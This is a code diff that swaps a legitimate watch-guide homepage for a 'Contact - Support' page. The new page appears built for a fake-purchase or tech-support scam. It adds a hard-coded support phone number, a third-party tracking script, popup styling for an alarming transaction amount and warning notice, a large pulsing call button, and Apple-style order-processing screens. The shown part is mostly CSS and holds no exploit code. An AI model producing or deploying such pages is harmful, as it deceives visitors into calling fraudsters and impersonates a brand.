@@ -1,75 +1,971 @@
-<?php header('Content-Type: text/html; charset=UTF-8'); ?>
-<!DOCTYPE html>
-<html lang="en">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Watcher | Strap Size Finder, Water Resistance &amp; Accuracy Tools</title>
-<meta name="description" content="Watcher is an independent guide to wristwatches, with a strap size finder, a water resistance decoder and an accuracy tracker for your own watch.">
-<meta name="robots" content="index, follow, max-image-preview:large">
-<link rel="canonical" href="https://watcher.com/">
-<meta property="og:type" content="website"><meta property="og:site_name" content="Watcher">
-<meta property="og:title" content="Watcher | Strap Size Finder, Water Resistance &amp; Accuracy Tools"><meta property="og:description" content="Watcher is an independent guide to wristwatches, with a strap size finder, a water resistance decoder and an accuracy tracker for your own watch.">
-<meta property="og:url" content="https://watcher.com/"><meta property="og:image" content="https://images.unsplash.com/photo-1784315253152-1d8903a608ad?auto=format&fit=crop&w=1200&q=75">
-<meta name="twitter:card" content="summary_large_image"><meta name="theme-color" content="#111417">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' fill='%23111417'/%3E%3Ccircle cx='20' cy='20' r='13' fill='none' stroke='%23F2EFE8' stroke-width='2.5'/%3E%3Cpath d='M20 11v9l6 4' fill='none' stroke='%23E8590C' stroke-width='2.8'/%3E%3C/svg%3E">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://images.unsplash.com">
-<link href="https://fonts.googleapis.com/css2?family=Farro:wght@400;700&family=Krub:wght@400;600&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/css/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "Organization", "name": "Watcher", "url": "https://watcher.com", "email": "hello@watcher.com", "telephone": "+1-888-777-5845", "address": {"@type": "PostalAddress", "streetAddress": "181 Mercer Street", "addressLocality": "New York", "addressRegion": "NY", "postalCode": "10012", "addressCountry": "US"}}, {"@type": "WebSite", "name": "Watcher", "url": "https://watcher.com"}, {"@type": "FAQPage", "mainEntity": [{"@type": "Question", "name": "Is a quartz or an automatic watch better for a first watch?", "acceptedAnswer": {"@type": "Answer", "text": "Quartz is more accurate, cheaper to own and needs only a battery every few years. An automatic is powered by the movement of your wrist and appeals if you enjoy mechanical things, but it will gain or lose a few seconds a day and needs servicing. Neither is the wrong choice."}}, {"@type": "Question", "name": "What size watch suits my wrist?", "acceptedAnswer": {"@type": "Answer", "text": "As a rule, the lugs should not overhang the edges of your wrist. Wrists under 16 cm usually suit cases of 34 to 38 mm, 16 to 18 cm suits 38 to 40 mm, and larger wrists can carry 40 to 44 mm comfortably."}}, {"@type": "Question", "name": "Can I swim with a watch marked 50 metres?", "acceptedAnswer": {"@type": "Answer", "text": "Light surface swimming is generally fine if the crown is pushed in and the seals are in good condition, but 100 metres is the safer minimum for regular swimming. The figure describes a static pressure test, not a depth you can dive to."}}, {"@type": "Question", "name": "How accurate should a mechanical watch be?", "acceptedAnswer": {"@type": "Answer", "text": "A healthy modern automatic typically runs within about ten to twenty seconds a day. If yours suddenly gains minutes, it may have become magnetised, which a watchmaker can correct in moments."}}, {"@type": "Question", "name": "How do I find my lug width?", "acceptedAnswer": {"@type": "Answer", "text": "Measure the gap between the two lugs, in millimetres, where the strap attaches. Most watches use an even number such as 18, 20 or 22 mm, and it is often engraved on the back of the original strap."}}, {"@type": "Question", "name": "How often does a watch battery need changing?", "acceptedAnswer": {"@type": "Answer", "text": "Most quartz watches run for two to five years on a battery. When the seconds hand starts jumping in steps of several seconds, the battery is low and should be replaced before it leaks."}}]}]}</script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+
+    <title>Contact - Support</title>
+
+    <link rel="stylesheet" href="css/kTa00i9n5NV8.html" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253Dsf%20pro%252Cv1_7csf%20pro%20icons%252Cv1html.html">
+ <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-2DMKRPGVF0');
+</script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
 </head>
-<body class="">
-<a class="skip" href="#main">Skip to content</a>
-<header class="wt-hd"><div class="wt-m wt-hd-r"><a class="logo" href="./" aria-label="Watcher home"><svg viewBox="0 0 40 40" aria-hidden="true"><circle cx="20" cy="20" r="16" fill="none" stroke="#F2EFE8" stroke-width="2.5"/><path d="M20 9v11l7 5" fill="none" stroke="#E8590C" stroke-width="2.8" stroke-linecap="round"/><rect x="36" y="18" width="4" height="4" fill="#F2EFE8"/></svg><span>WATCHER</span></a><nav id="nav" aria-label="Main navigation"><ul><li><a href="./" aria-current="page"><small>01</small>Home</a></li><li><a href="watch-buying-guide.html"><small>02</small>First Watch</a></li><li><a href="watch-strap-guide.html"><small>03</small>Straps</a></li><li><a href="about.html"><small>04</small>About</a></li><li><a href="contact.html"><small>05</small>Contact</a></li></ul></nav><button class="burger" aria-label="Open menu" aria-expanded="false" aria-controls="nav"><b></b><b></b><b></b></button></div></header>
-<main id="main">
 
-<section class="wt-hero"><div class="wt-m wt-hero-g"><div><p class="wt-code">REF. 001 / INDEPENDENT WATCH NOTES</p><h1>Know the watch on your wrist.</h1><p class="wt-lede">Watcher explains wristwatches in plain language: how to choose a first one, what the numbers on the caseback mean, and how to get a strap that actually fits. Three small instruments below do the arithmetic.</p><p class="wt-cta"><a class="btn" href="#instruments">Open the instruments</a><a class="wt-txt" href="watch-buying-guide.html">First watch guide</a></p></div>
-<figure class="wt-dial"><img src="https://images.unsplash.com/photo-1784315253152-1d8903a608ad?auto=format&fit=crop&w=760&h=760&q=75" alt="chronograph wristwatch with a dark dial and leather strap" width="760" height="760" fetchpriority="high"></figure></div></section>
+<script>
+ 
+  window.SUPPORT_PHONE = {
+    display: "+1(888) 902-7808",   
+    tel:     "+18889027808"        
+  };
+</script>
 
-<section class="wt-strip" aria-label="Quick facts"><div class="wt-m wt-strip-g"><div><b>&plusmn;15 s</b><span>a month is typical for a quartz watch</span></div><div><b>&plusmn;10&ndash;20 s</b><span>a day is normal for an automatic</span></div><div><b>100 m</b><span>is the sensible minimum rating for swimming</span></div><div><b>20 mm</b><span>is the most common lug width on men&rsquo;s watches</span></div></div></section>
 
-<section class="wt-sec" id="instruments"><div class="wt-m"><p class="wt-code">SECTION 01 / INSTRUMENTS</p><h2>Three instruments for three common questions</h2>
-<div class="wt-inst" id="strap"><div class="wt-inst-n"><span>01</span><h3>Strap Size Finder</h3><p>Wrist and case in, strap length and width out.</p></div><div class="wt-inst-f"><label for="ss-w">Wrist circumference (cm)<input id="ss-w" type="number" min="12" max="24" step="0.5" value="17" inputmode="decimal"></label><label for="ss-c">Case diameter<select id="ss-c"><option value="34">34 mm</option><option value="36">36 mm</option><option value="38">38 mm</option><option value="40" selected>40 mm</option><option value="42">42 mm</option><option value="44">44 mm</option></select></label></div><div class="wt-inst-o" id="ss-r" aria-live="polite"></div></div>
-<div class="wt-inst" id="water"><div class="wt-inst-n"><span>02</span><h3>Water Resistance Decoder</h3><p>What the rating on the caseback really allows.</p></div><div class="wt-inst-f"><label for="wr-r">Rating on the watch<select id="wr-r"><option value="0">None, or &ldquo;water resistant&rdquo; only</option><option value="30">30 m / 3 ATM</option><option value="50" selected>50 m / 5 ATM</option><option value="100">100 m / 10 ATM</option><option value="200">200 m / 20 ATM</option><option value="300">300 m or diver rated</option></select></label><label for="wr-c">Crown type<select id="wr-c"><option value="push">Push-in crown</option><option value="screw">Screw-down crown</option></select></label></div><div class="wt-inst-o" id="wr-o" aria-live="polite"></div></div>
-<div class="wt-inst" id="rate"><div class="wt-inst-n"><span>03</span><h3>Accuracy Tracker</h3><p>Set your watch to a reference clock, check again later.</p></div><div class="wt-inst-f"><label for="ac-s">Seconds gained (+) or lost (&minus;)<input id="ac-s" type="number" min="-3600" max="3600" value="42" inputmode="numeric"></label><label for="ac-d">Over how many days<input id="ac-d" type="number" min="1" max="60" value="5" inputmode="numeric"></label><label for="ac-m">Movement<select id="ac-m"><option value="auto" selected>Automatic or hand-wound</option><option value="quartz">Quartz</option></select></label></div><div class="wt-inst-o" id="ac-r" aria-live="polite"></div></div>
-</div></section>
+<style>
 
-<section class="wt-sec wt-bone"><div class="wt-m"><p class="wt-code">SECTION 02 / WHAT MAKES IT TICK</p><h2>Four kinds of movement</h2><div class="wt-mov">
-<div><span>A</span><h3>Quartz</h3><p>A battery sends current through a quartz crystal that vibrates at a fixed rate. Very accurate, slim and tough. The seconds hand ticks once a second.</p><dl><dt>Upkeep</dt><dd>Battery every 2&ndash;5 years</dd></dl></div>
-<div><span>B</span><h3>Automatic</h3><p>A weighted rotor winds the mainspring as your wrist moves. The seconds hand sweeps smoothly. Stops after a day or two off the wrist.</p><dl><dt>Upkeep</dt><dd>Service every 5&ndash;8 years</dd></dl></div>
-<div><span>C</span><h3>Hand-wound</h3><p>You wind the crown yourself, usually once a day. Thinner than an automatic and a pleasant morning ritual for those who like one.</p><dl><dt>Upkeep</dt><dd>Service every 5&ndash;8 years</dd></dl></div>
-<div><span>D</span><h3>Solar</h3><p>A quartz movement charged by light through the dial. Runs for months in the dark once full and avoids regular battery changes.</p><dl><dt>Upkeep</dt><dd>Cell replaced after 10+ years</dd></dl></div></div><div class="wt-pair"><figure><img src="https://images.unsplash.com/photo-1766306285696-5469242d8085?auto=format&fit=crop&w=760&h=420&q=75" alt="close-up of watch gears and mechanism" width="760" height="420" loading="lazy"><figcaption>Inside a mechanical movement: gears driven by a coiled spring.</figcaption></figure><figure><img src="https://images.unsplash.com/photo-1790699745880-36b39ef57101?auto=format&fit=crop&w=760&h=420&q=75" alt="back of a gold watch with a visible mechanical movement" width="760" height="420" loading="lazy"><figcaption>A display caseback lets you watch the balance wheel at work.</figcaption></figure></div></div></section>
 
-<section class="wt-sec"><div class="wt-m wt-parts"><figure><img src="https://images.unsplash.com/photo-1793247804636-4f57bdb02abe?auto=format&fit=crop&w=720&h=800&q=75" alt="macro view of a skeleton watch dial" width="720" height="800" loading="lazy"></figure><div><p class="wt-code">SECTION 03 / VOCABULARY</p><h2>Six words that explain most of a watch</h2><dl class="wt-gloss"><div><dt>Case</dt><dd>The metal body. Its diameter is quoted without the crown.</dd></div><div><dt>Lugs</dt><dd>The four horns the strap attaches to. Lug-to-lug length decides fit more than diameter does.</dd></div><div><dt>Crown</dt><dd>The knob for setting and winding. Screw-down crowns seal better.</dd></div><div><dt>Crystal</dt><dd>The clear cover. Sapphire resists scratches; mineral glass and acrylic mark more easily.</dd></div><div><dt>Bezel</dt><dd>The ring around the crystal. Some rotate for timing.</dd></div><div><dt>Lume</dt><dd>The glow-in-the-dark paint on hands and markers. It charges from light.</dd></div></dl></div></div></section>
+.popup-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.55);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  z-index: 99999;
+}
 
-<section class="wt-sec wt-bone"><div class="wt-m"><p class="wt-code">SECTION 04 / LONG READS</p><h2>Two guides</h2><div class="wt-guides">
-<a class="wt-gd" href="watch-buying-guide.html"><img src="https://images.unsplash.com/photo-1784004120304-82157a4b2a2e?auto=format&fit=crop&w=700&h=440&q=75" alt="watch with a brown leather strap beside a book" width="700" height="440" loading="lazy"><div><span>GUIDE A</span><h3>The First Watch Guide</h3><p>Movement, size, crystal and water resistance: the four decisions, in the order that makes them easy.</p></div></a>
-<a class="wt-gd" href="watch-strap-guide.html"><img src="https://images.unsplash.com/photo-1776083760415-3c726f6a1398?auto=format&fit=crop&w=700&h=440&q=75" alt="pile of colourful watch bands and straps" width="700" height="440" loading="lazy"><div><span>GUIDE B</span><h3>The Strap Guide</h3><p>Leather, steel, rubber and fabric compared, how to measure, and how to change a strap without scratching the lugs.</p></div></a></div></div></section>
+.ps-popup {
+  width: 100%;
+  max-width: 430px;
+  background: #ffffff;
+  border-radius: 20px;
+  overflow: hidden;
+  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+  animation: popupIn 0.25s ease-out;
+  position: relative;
+}
 
-<section class="wt-sec"><div class="wt-m"><p class="wt-code">SECTION 05 / HABITS</p><h2>Wear it well</h2><div class="wt-dd"><div class="wt-do"><h3>Do</h3><ul><li>Push or screw the crown fully home after setting the time.</li><li>Rinse the watch in fresh water after the sea or a pool, if it is rated for swimming.</li><li>Take it off by sitting down or holding it over a soft surface.</li><li>Store it away from speakers, tablet covers and magnetic clasps.</li><li>Wipe the caseback and strap weekly with a soft dry cloth.</li></ul></div><div class="wt-dont"><h3>Avoid</h3><ul><li>Changing the date between about nine in the evening and three in the morning on a mechanical watch.</li><li>Pressing chronograph buttons or turning the crown under water.</li><li>Hot showers, saunas and steam rooms, whatever the rating.</li><li>Leaving a dead battery inside a quartz watch for months.</li><li>Opening the caseback yourself unless you can pressure test it afterwards.</li></ul></div></div></div></section>
+@keyframes popupIn {
+  from { opacity: 0; transform: translateY(15px) scale(0.97); }
+  to   { opacity: 1; transform: translateY(0)   scale(1);    }
+}
 
-<section class="wt-sec wt-bone"><div class="wt-m wt-mini"><img src="https://images.unsplash.com/photo-1792097351764-8d93cbc6f379?auto=format&fit=crop&w=640&h=640&q=75" alt="watchmaker wearing a loupe while repairing a watch" width="640" height="640" loading="lazy"><div><p class="wt-code">SECTION 06 / ON THE BENCH</p><h2>When to see a watchmaker</h2><p>Most watch trouble is slow and quiet: a little moisture under the crystal, a crown that feels gritty, a rate that drifts week by week. Each of these is cheap to fix early and costly to ignore.</p><ul class="wt-flag"><li>Fog or droplets under the crystal</li><li>A sudden gain of a minute or more a day</li><li>A crown that will not screw down smoothly</li><li>A rotor you can hear rattling loosely</li><li>A battery older than five years</li></ul></div></div></section>
+.ps-popup .popup-header {
+  background: #ffffff;
+  padding: 24px 24px 18px;
+  border-bottom: 0.5px solid #e5e5ea;
+  text-align: center;
+}
 
-<section class="wt-sec"><div class="wt-m wt-faqg"><div><p class="wt-code">SECTION 07 / FAQ</p><h2>Asked most often</h2></div><div class="wt-faq"><details open><summary>Is a quartz or an automatic watch better for a first watch?</summary><p>Quartz is more accurate, cheaper to own and needs only a battery every few years. An automatic is powered by the movement of your wrist and appeals if you enjoy mechanical things, but it will gain or lose a few seconds a day and needs servicing. Neither is the wrong choice.</p></details><details><summary>What size watch suits my wrist?</summary><p>As a rule, the lugs should not overhang the edges of your wrist. Wrists under 16 cm usually suit cases of 34 to 38 mm, 16 to 18 cm suits 38 to 40 mm, and larger wrists can carry 40 to 44 mm comfortably.</p></details><details><summary>Can I swim with a watch marked 50 metres?</summary><p>Light surface swimming is generally fine if the crown is pushed in and the seals are in good condition, but 100 metres is the safer minimum for regular swimming. The figure describes a static pressure test, not a depth you can dive to.</p></details><details><summary>How accurate should a mechanical watch be?</summary><p>A healthy modern automatic typically runs within about ten to twenty seconds a day. If yours suddenly gains minutes, it may have become magnetised, which a watchmaker can correct in moments.</p></details><details><summary>How do I find my lug width?</summary><p>Measure the gap between the two lugs, in millimetres, where the strap attaches. Most watches use an even number such as 18, 20 or 22 mm, and it is often engraved on the back of the original strap.</p></details><details><summary>How often does a watch battery need changing?</summary><p>Most quartz watches run for two to five years on a battery. When the seconds hand starts jumping in steps of several seconds, the battery is low and should be replaced before it leaks.</p></details></div></div></section>
+.ps-popup .brand-icon {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 14px;
+}
 
-<section class="wt-sec wt-sub"><div class="wt-m"><p class="wt-code">MONTHLY / BY EMAIL</p><h2>The Watcher Dispatch</h2><p>One short explanation of how something in a watch works, once a month.</p><p><a class="btn" href="mailto:hello@watcher.com?subject=The%20Watcher%20Dispatch&amp;body=Please%20subscribe%20me.">Subscribe by email</a></p></div></section>
+.ps-popup .brand-icon img {
+  width: 140px;
+  height: auto;
+  display: block;
+  margin-top: -10px;
+  margin-bottom: -15px;
+}
 
-</main>
-<footer class="wt-ft"><div class="wt-m"><div class="wt-ft-top"><a class="logo" href="./"><svg viewBox="0 0 40 40" aria-hidden="true"><circle cx="20" cy="20" r="16" fill="none" stroke="#F2EFE8" stroke-width="2.5"/><path d="M20 9v11l7 5" fill="none" stroke="#E8590C" stroke-width="2.8" stroke-linecap="round"/><rect x="36" y="18" width="4" height="4" fill="#F2EFE8"/></svg><span>WATCHER</span></a><p>Independent notes on choosing, wearing and looking after a wristwatch.</p></div><div class="wt-ft-grid"><section><h4>Read</h4><a href="watch-buying-guide.html">First Watch Guide</a><a href="watch-strap-guide.html">Strap Guide</a><a href="about.html">About</a><a href="contact.html">Contact</a></section><section><h4>Instruments</h4><a href="./#strap">Strap Size Finder</a><a href="./#water">Water Resistance Decoder</a><a href="./#rate">Accuracy Tracker</a></section><section><h4>Policies</h4><a href="privacy-policy.html">Privacy Policy</a><a href="terms-and-conditions.html">Terms &amp; Conditions</a><a href="cookie-policy.html">Cookie Policy</a><a href="disclaimer.html">Disclaimer</a><a href="editorial-policy.html">Editorial Policy</a></section><section class="wt-ft-con"><h4>Contact</h4><span>181 Mercer Street, New York, NY 10012, United States</span><a href="tel:+18887775845">+1-888-777-5845</a><a href="mailto:hello@watcher.com">hello@watcher.com</a></section></div><div class="wt-ft-end"><span>&copy; <span id="year">2026</span> Watcher. All rights reserved.</span></div></div></footer>
-<div class="cookie" id="cookie" role="dialog" aria-label="Cookie notice"><p>We use essential storage and, with your consent, cookies for our live chat and any ads shown on the site. <a href="cookie-policy.html">Cookie Policy</a></p><button class="y" data-cookie="accepted">Accept</button><button data-cookie="declined">Essential only</button></div>
-<script src="assets/js/main.js" defer></script>
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/626be649b0d10b6f3e6ff291/1g1qnn49c';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
+.ps-popup .popup-header h2 {
+  color: #222;
+  font-size: 21px;
+  margin-bottom: 5px;
+  text-align: center;
+}
+
+.ps-popup .popup-header p {
+  color: #666;
+  font-size: 15px;
+  text-align: center;
+}
+
+.ps-popup .popup-body {
+  padding: 22px 24px;
+}
+
+.ps-popup .popup-body > p {
+  font-size: 14px;
+  color: #333;
+  line-height: 1.5;
+  margin: 0 0 8px;
+}
+
+.ps-popup .transaction-box {
+  background: #f7f7f9;
+  border-radius: 13px;
+  padding: 16px;
+  margin: 16px 0;
+}
+
+.ps-popup .transaction-row {
+  display: flex;
+  justify-content: space-between;
+  gap: 15px;
+  padding: 8px 0;
+  font-size: 14px;
+}
+
+.ps-popup .transaction-row span:first-child {
+  color: #777;
+}
+
+.ps-popup .transaction-row span:last-child {
+  color: #222;
+  font-weight: 600;
+  text-align: right;
+}
+
+.ps-popup .amount {
+  color: #d92d20 !important;
+  font-size: 16px;
+}
+
+.ps-popup .status {
+  color: #16803c !important;
+}
+
+.ps-popup .notice {
+  background: #fff4f2;
+  border-left: 4px solid #e5484d;
+  padding: 12px;
+  border-radius: 7px;
+  color: #6b2525;
+  font-size: 15px;
+  line-height: 1.5;
+  margin-bottom: 18px;
+}
+
+.ps-popup .buttons {
+  display: flex;
+  gap: 10px;
+}
+
+.ps-popup button {
+  flex: 1;
+  border-radius: 11px;
+  padding: 13px 10px;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: 0.2s;
+}
+
+.ps-popup .primary-btn {
+  background: #000;
+  color: #fff;
+  border: none;
+}
+
+.ps-popup .primary-btn:hover {
+  background: #222;
+}
+
+.ps-popup .secondary-btn {
+  background: #fff;
+  color: #000;
+  border: 2px solid #000;
+}
+
+.ps-popup .secondary-btn:hover {
+  background: #f5f5f5;
+}
+
+.ps-popup .popup-footer {
+  padding: 0 24px 22px;
+  color: #888;
+  font-size: 11px;
+  line-height: 1.5;
+  text-align: center;
+}
+
+@media (max-width: 480px) {
+  .ps-popup { border-radius: 16px; }
+  .ps-popup .popup-body,
+  .ps-popup .popup-header { padding-left: 20px; padding-right: 20px; }
+}
+
+/* ===== EXISTING STYLES ===== */
+@media (min-width: 768px) {
+    .popup-content .btn-row {
+        display: flex;
+        gap: 12px;
+    }
+
+    .popup-content .btn-row button {
+    flex: 1;
+    margin: 0;
+    padding: 14px;
+    font-size: 16px;
+    border-radius: 8px;
+}
+}
+
+    .popup {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 140%;
+        background: rgba(0,0,0,0.6);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+    }
+
+.popup-content button {
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 600;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+.popup-content .btn-row button:first-child {
+    background: #000;
+    color: #fff;
+    border: none;
+}
+
+.popup-content .btn-row button:last-child {
+    background: #fff;
+    color: #000;
+    border: 2px solid #000;
+}
+
+.popup-content > button {
+    width: 100%;
+    margin-top: 12px;
+    background: #f5f5f5;
+    border: 2px solid #000;
+}
+
+.popup-content {
+    background: linear-gradient(135deg, #ffffff, #f2f2f2);
+    color: #000;
+    width: 420px;
+    max-width: 90%;
+    text-align: center;
+    padding: 25px;
+    border-radius: 12px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    transform: translateY(-40%);
+}
+.popup-content p {
+    width: 100%;
+    text-align: left;
+    margin-bottom: 20px;
+}
+.popup-title {
+    width: 100%;
+    text-align: center;
+    font-size: 26px;
+    font-weight: 700;
+    margin-bottom: 20px;
+    color: #fff;
+    line-height: 1.4;
+}
+.popup-text {
+    width: 100%;
+    font-size: 18px;
+    font-weight: 500;
+    line-height: 1.5;
+    color: #000;
+    margin-bottom: 20px;
+}
+@import url('https://fonts.googleapis.com/css2?family=Manrope:wght@500;700&amp;display=swap');
+
+  .call-popup-wrapper {
+    position: fixed;
+    bottom: 50px;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 99999;
+    font-family: 'Manrope', sans-serif;
+    opacity: 0;
+    animation: none;
+  }
+
+  .call-popup-btn {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: #111111;
+    color: #ffffff;
+    text-decoration: none;
+    padding: 32px 72px;
+    border-radius: 50px;
+    font-size: 32px;
+    font-weight: 700;
+    letter-spacing: 0.02em;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.35), 0 2px 8px rgba(0,0,0,0.18);
+    transition: transform 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
+    white-space: nowrap;
+    border: none;
+    cursor: pointer;
+  }
+
+  .call-popup-btn:hover {
+    background: #222222;
+    transform: translateX(-0%) translateY(-3px);
+    box-shadow: 0 16px 40px rgba(0, 0, 0, 0.4), 0 4px 12px rgba(0,0,0,0.2);
+  }
+
+  .call-popup-btn:active {
+    transform: translateX(-0%) translateY(0px);
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+  }
+
+  .call-icon-wrap {
+    position: relative;
+    width: 22px;
+    height: 22px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .call-icon-wrap::before {
+    content: '';
+    position: absolute;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.12);
+    animation: pulse 1.8s ease-out infinite;
+  }
+
+  .call-icon {
+    width: 18px;
+    height: 18px;
+    fill: #ffffff;
+    position: relative;
+    z-index: 1;
+  }
+
+  .call-label {
+    text-decoration: underline;
+    text-underline-offset: 3px;
+    text-decoration-thickness: 1.5px;
+    text-decoration-color: rgba(255,255,255,0.5);
+  }
+
+  @keyframes pulse {
+    0%   { transform: scale(0.8); opacity: 0.8; }
+    70%  { transform: scale(1.6); opacity: 0;   }
+    100% { transform: scale(0.8); opacity: 0;   }
+  }
+
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateX(-50%) translateY(24px); }
+    to   { opacity: 1; transform: translateX(-50%) translateY(0);    }
+  }
+
+  @media (max-width: 480px) {
+    .call-popup-btn {
+      padding: 22px 44px;
+      font-size: 22px;
+    }
+  }
+  .popup-heading {
+    display: block;
+    font-size: 20px;
+    font-weight: 700;
+    margin-bottom: 8px;
+}
+
+.popup-subtext {
+    font-size: 18px;
+    font-weight: 700;
+    line-height: 1.6;
+    margin: 0;
+    text-align: right;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+      width: 100%;
+      min-height: 100dvh;
+      overflow-x: hidden;
+      overflow-y: auto;
+      background: #f5f5f7;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', Arial, sans-serif;
+      touch-action: pan-x pan-y;
+    }
+
+    .apple-nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      height: 52px;
+      background: rgba(245,245,247,0.92);
+      backdrop-filter: saturate(180%) blur(20px);
+      -webkit-backdrop-filter: saturate(180%) blur(20px);
+      border-bottom: 0.5px solid #d2d2d7;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 clamp(1rem, 5vw, 1.5rem);
+      z-index: 100;
+    }
+    .nav-left { display: flex; align-items: center; gap: 8px; }
+    .nav-title { font-size: 17px; font-weight: 600; color: #1d1d1f; letter-spacing: -0.3px; }
+
+    .nav-cart {
+      display: flex; align-items: center; justify-content: center;
+      width: 38px; height: 38px;
+      border-radius: 50%;
+      cursor: pointer;
+      position: relative;
+      -webkit-tap-highlight-color: transparent;
+      transition: background 0.15s;
+    }
+    .nav-cart:active { background: #e5e5ea; }
+    .cart-badge {
+      position: absolute;
+      top: 1px; right: 1px;
+      width: 17px; height: 17px;
+      background: #0071e3;
+      border-radius: 50%;
+      font-size: 10px; font-weight: 700;
+      color: #fff;
+      display: flex; align-items: center; justify-content: center;
+      border: 1.5px solid #f5f5f7;
+    }
+
+    #processing {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 100dvh;
+      padding-top: 52px;
+      background: #f5f5f7;
+      text-align: center;
+      padding-left: 1rem;
+      padding-right: 1rem;
+    }
+
+    #confirmed {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      width: 100%;
+      min-height: 100dvh;
+      padding-top: 68px;
+      padding-bottom: max(env(safe-area-inset-bottom, 16px), 20px);
+      padding-left: clamp(12px, 4vw, 20px);
+      padding-right: clamp(12px, 4vw, 20px);
+      gap: 0;
+      overflow: visible;
+    }
+
+    canvas#confetti {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none; z-index: 98;
+    }
+
+    .spinner {
+      width: 38px; height: 38px;
+      border: 2.5px solid #d2d2d7;
+      border-top: 2.5px solid #1d1d1f;
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+      margin-top: 1.25rem;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .check-ring {
+      width: clamp(44px, 12vw, 60px);
+      height: clamp(44px, 12vw, 60px);
+      border-radius: 50%; background: #34c759;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto clamp(4px, 1.2vh, 8px);
+      animation: popIn 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      flex-shrink: 0;
+    }
+    @keyframes popIn { from { transform: scale(0.3); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+    .card {
+      background: #ffffff;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 420px;
+      padding: clamp(10px, 2.2vh, 18px) clamp(14px, 4vw, 20px);
+      margin-bottom: clamp(6px, 1.4vh, 10px);
+      flex-shrink: 0;
+    }
+
+    .divider {
+      height: 0.5px;
+      background: #e5e5ea;
+      margin: clamp(6px, 1.4vh, 10px) 0;
+      width: 100%;
+    }
+
+    .progress-wrap {
+      display: flex; align-items: flex-start;
+      justify-content: center; width: 100%;
+    }
+    .step { display: flex; flex-direction: column; align-items: center; gap: 4px; flex: 1; }
+    .dot {
+      width: clamp(22px, 6vw, 28px);
+      height: clamp(22px, 6vw, 28px);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      font-size: clamp(9px, 2.5vw, 11px); font-weight: 600;
+      position: relative; z-index: 1; flex-shrink: 0;
+    }
+    .dot.done  { background: #1d1d1f; color: #fff; }
+    .dot.active{ background: #0071e3; color: #fff; }
+    .dot.pending{ background: #e5e5ea; color: #aeaeb2; }
+    .step-line {
+      flex: 1; height: 2px;
+      margin-top: clamp(10px, 2.8vw, 13px);
+      z-index: 0;
+    }
+    .step-line.done   { background: #1d1d1f; }
+    .step-line.pending{ background: #e5e5ea; }
+    .step-lbl {
+      font-size: clamp(9px, 2.4vw, 11px);
+      text-align: center; letter-spacing: -0.1px;
+    }
+    .step-lbl.done   { color: #1d1d1f; font-weight: 500; }
+    .step-lbl.active { color: #0071e3; font-weight: 500; }
+    .step-lbl.pending{ color: #aeaeb2; }
